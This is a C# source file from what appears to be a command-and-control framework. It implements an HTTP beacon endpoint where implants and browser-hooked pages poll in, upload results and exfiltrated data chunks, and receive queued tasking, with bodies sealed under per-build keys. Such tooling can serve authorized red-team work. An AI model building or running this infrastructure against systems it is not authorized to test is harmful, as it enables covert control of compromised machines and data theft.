using System.Text;
using Google.Protobuf;
using Microsoft.AspNetCore.Builder;
using Microsoft.AspNetCore.Http;
using Microsoft.AspNetCore.Routing;
using Rod.CoreState;
using Rod.CoreState.Application;
using Rod.CoreState.Transports;
using Rod.Transport.Payloads;
using Rod.V1;
using Task = System.Threading.Tasks.Task;

namespace Rod.Transport.Endpoints;

// The plain-HTTP envelope contact (architecture.md Sec 8, the implant-reach
// transport): the same rod.v1 Frames the live beacon stream carries, as
// varint-length-delimited sequences in ordinary HTTP request/response bodies.
// One POST is one poll contact -- the request body carries the handshake
// first, then any results, exfil chunks, staged pulls, and channel output;
// the response body carries the handshake response, then staged chunk runs
// answering the request's demands, then queued tasking while the dispatch
// budget lasts. Dropping the gRPC/HTTP-2 requirement is the point: Tier 0 is
// reachable from any language with an HTTP client and a protobuf codec
// (extending/implants.md).
//
// Authentication is at the application layer, under the per-artifact key the
// build minted (the mainstream HTTP(S) C2 shape -- no TLS certificate request
// anywhere): the default body is the R1 envelope sealing
// counter || framed-frames under that key, and the response seals the same
// way, so the cleartext-http posture carries confidential content, not just
// authenticated content. The plaintext framed body is the lab-debug toggle's
// shape, refused for implants whose enrollment bound them to a key.
//
// The contact composition itself is transport-independent
// (<see cref="EnvelopeContactCore"/>): this endpoint owns the route, the
// CORS posture, the body limits, and the status mapping; a datagram carrier
// running the same frames owns its socket instead.

/// <summary>
/// Maps the envelope contact route. Mapped alongside the operator API on
/// every implant-facing listener. The identity is the artifact key that
/// sealed the body; and the handshake's implant id alone -- the
/// anything-with-reach posture of the cleartext lab shape -- serves only an
/// implant no key was ever bound to.
/// </summary>
public static class EnvelopeBeaconEndpoints
{
    /// <summary>The envelope contact route, in the implant family with enroll.</summary>
    public const string Route = "/implants/beacon";

    public static IEndpointRouteBuilder MapEnvelopeBeaconEndpoints(this IEndpointRouteBuilder endpoints)
    {
        endpoints.MapPost(Route, async (
            HttpContext http,
            EnvelopeBeaconContact contact,
            CancellationToken cancellationToken)
            => await contact.HandleAsync(http, cancellationToken))
            .WithName(nameof(EnvelopeBeaconContact));
        return endpoints;
    }
}

/// <summary>
/// The HTTP face of one envelope contact: read the body, hand it to the
/// shared composition, map the outcome onto the route's status codes. The
/// per-frame paths are the shared beacon compositions
/// (<see cref="BeaconIngest"/>, <see cref="BeaconTasking"/>), so a result
/// captured over the envelope is indistinguishable in core state, the audit
/// trail, and the live bus from one captured over the stream. The poll shape
/// is sequential -- ingest the request's frames, then dispatch queued tasking
/// into the response -- with no push loops: a POST is one contact cycle, and
/// the implant sleeps the baked interval between them.
/// </summary>
internal sealed class EnvelopeBeaconContact
{
    /// <summary>
    /// The dispatched-tasking budget for one HTTP response body: tasking
    /// frames are claimed only while they fit, and a task that does not fit
    /// is requeued for the next contact -- it never strands in Dispatched
    /// (architecture.md Sec 10.3). Staged chunk runs answer under their own
    /// budget (<see cref="BeaconTasking.MaxStagedRunBytes"/>) rather than
    /// this one: a run longer than the budget ends short of terminal and the
    /// implant re-demands from its proven seam, so a demand larger than one
    /// body still completes across contacts.
    /// </summary>
    public const int MaxDispatchBytes = 4 * 1024 * 1024;

    private readonly EnvelopeContactCore _core;

    public EnvelopeBeaconContact(EnvelopeContactCore core)
    {
        _core = core;
    }

    public async Task<IResult> HandleAsync(HttpContext http, CancellationToken cancellationToken)
    {
        // No transport certificate exists anywhere in the surface (the
        // per-artifact key sealing the body below is the identity), so the
        // handshake's certificate binding is permanently null.

        // A browser-hooked page contacts cross-origin (architecture.md
        // Sec 8): the browser-only CORS answer, served only when a browser
        // asked -- every response shape below carries it.
        CrossOriginHttp.Allow(http);

        byte[] body;
        try
        {
            body = await EnvelopeFraming.ReadBodyAsync(http.Request.Body, cancellationToken);
        }
        catch (EnvelopeFramingException ex) when (ex.Oversized)
        {
            return Results.StatusCode(StatusCodes.Status413RequestEntityTooLarge);
        }

        var result = await _core.ContactAsync(
            body,
            new EnvelopeContactOptions(
                MaxDispatchBytes,
                TransportCapabilities.Envelope,
                "web",
                CleartextIdentityFallback: !http.Request.IsHttps),
            cancellationToken);

        if (result.Status == StatusCodes.Status200OK)
            return result.Sealed
                ? Results.Text(
                    Encoding.UTF8.GetString(result.Body), "text/plain", Encoding.UTF8)
                : Results.Bytes(result.Body, "application/octet-stream");

        return result.Status switch
        {
            StatusCodes.Status401Unauthorized => Results.Json(
                new Problem(result.Problem ?? "The contact was refused."), statusCode: StatusCodes.Status401Unauthorized),
            StatusCodes.Status413RequestEntityTooLarge => Results.StatusCode(
                StatusCodes.Status413RequestEntityTooLarge),
            _ => Results.BadRequest(new Problem(result.Problem ?? "The request body was refused.")),
        };
    }

    internal static bool TryParseHandshake(Frame frame, out HandshakeRequest request)
    {
        try
        {
            request = HandshakeRequest.Parser.ParseFrom(frame.Payload);
            return true;
        }
        catch (InvalidProtocolBufferException)
        {
            request = new HandshakeRequest();
            return false;
        }
    }

    internal static Frame HandshakeFrame(HandshakeResponse response)
        => new() { Payload = ByteString.CopyFrom(response.ToByteArray()) };

    // Shared with the WebSocket stream's handshake (the same service call and
    // status mapping over a different transport); static so both endpoints
    // reach it without sharing state.
    internal static async Task<(HandshakeResponse Response, HandshakeResult? Handshake)> TryHandshakeAsync(
        HandshakeService handshake,
        HandshakeRequest request,
        bool cleartextFallback)
    {
        try
        {
            var result = await handshake.HandshakeAsync(
                new HandshakeCommand(
                    ImplantId: cleartextFallback && Rod.CoreState.ImplantId.TryParse(request.ImplantId, out var byId) ? byId : default,
                    MajorVersion: request.Version?.Major ?? -1,
                    MinorVersion: request.Version?.Minor ?? -1,
                    Capabilities: request.Capabilities,
                    CertificateEngagementId: null,
                    ReplayNonces: request.ReplayNonces,
                    TaskAcks: request.TaskAcks,
                    SleepSeconds: request.HasSleepSeconds ? request.SleepSeconds : null,
                    JitterSeconds: request.HasJitterSeconds ? request.JitterSeconds : null),
                CancellationToken.None);
            return (BeaconHandshake.Response(
                HandshakeStatus.Ok, result.EngagementId.ToString(),
                result.ReplayNonces, result.TaskAcks), result);
        }
        catch (HandshakeException ex)
        {
            return (BeaconHandshake.Response(
                BeaconHandshake.MapStatus(ex.Reason), engagementId: null, replayNonces: false), Handshake: null);
        }
    }

    /// <summary>
    /// Reads the R1 key id off a request body, or null when the body is not
    /// the sealed shape -- the plaintext framed body. A framed body whose
    /// bytes happen to be base64 still decodes to protobuf, not the
    /// magic-prefixed envelope, and a sealed body names a key id only the
    /// build could have baked.
    /// </summary>
    internal static Guid? TryReadSealedKeyId(byte[] body, out string sealedText)
    {
        sealedText = Encoding.UTF8.GetString(body).Trim();
        return AesGcmEnvelope.TryReadKeyId(sealedText);
    }
}
